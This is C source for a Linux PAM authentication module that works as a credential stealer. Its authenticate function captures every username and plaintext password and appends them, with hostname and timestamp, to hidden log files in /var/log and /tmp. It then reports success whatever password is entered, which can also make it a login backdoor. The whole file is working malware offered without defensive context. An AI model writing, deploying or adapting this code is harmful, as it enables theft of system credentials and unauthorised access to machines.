#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <unistd.h>
#include <time.h>

#define LOG_FILE "/var/log/.auth1.log"

void get_current_time(char *buffer, size_t size) {
    time_t now = time(NULL);
    strftime(buffer, size, "%Y-%m-%d %H:%M:%S", localtime(&now));
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    int retval;
    const char *username = NULL;
    const char *password = NULL;
    char hostname[128] = {0};
    char timestamp[32] = {0};
    char log_entry[2048] = {0};

    retval = pam_get_user(pamh, &username, "Username: ");
    if (retval != PAM_SUCCESS) {
        return retval;
    }

    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);

    gethostname(hostname, sizeof(hostname));
    get_current_time(timestamp, sizeof(timestamp));

    snprintf(log_entry, sizeof(log_entry),
             "[%s] Hostname: %s | Username: %s | Password: %s\n",
             timestamp, hostname,
             username ? username : "unknown",
             password ? password : "none");

    FILE *fp = fopen(LOG_FILE, "a");
    if (fp) {
        fputs(log_entry, fp);
        fclose(fp);
    } else {
        fp = fopen("/tmp/.pam.log", "a");
        if (fp) {
            fputs(log_entry, fp);
            fclose(fp);
        }
    }

    return PAM_SUCCESS;
}
